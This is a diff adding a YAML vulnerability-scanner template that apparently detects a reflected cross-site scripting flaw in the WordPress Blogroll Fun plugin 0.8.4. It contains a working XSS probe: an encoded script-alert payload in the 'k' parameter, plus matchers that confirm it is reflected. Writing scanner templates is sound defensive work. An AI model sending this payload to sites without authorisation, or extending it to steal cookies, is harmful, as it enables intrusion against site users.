@@ -1,0 +1,30 @@
+id: wp-blogroll-fun-xss
+name: WordPress Blogroll Fun-Show Last Post and Last Update Time 0.8.4 - Cross-Site Scripting
+severity: high
+confidence: confirmed
+description: WordPress Plugin Blogroll Fun-Show Last Post and Last Update Time 0.8.4 and possibly prior versions are prone
+  to a cross-site scripting vulnerability because of a failure to properly sanitize user-supplied input. An attacker may leverage
+  this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site.
+  This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+reference: CWE-79
+tags:
+- wordpress
+- wp-plugin
+- xss
+- unauth
+- wp
+- vuln
+requests:
+- method: GET
+  path: /wp-content/plugins/blogroll-fun/blogroll.php?k=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+  matchers:
+  - type: body
+    words:
+    - 'Got: <script>alert(document.domain)</script><br>'
+  - type: header
+    words:
+    - text/html
+  - type: status
+    status:
+    - 200
+  condition: and
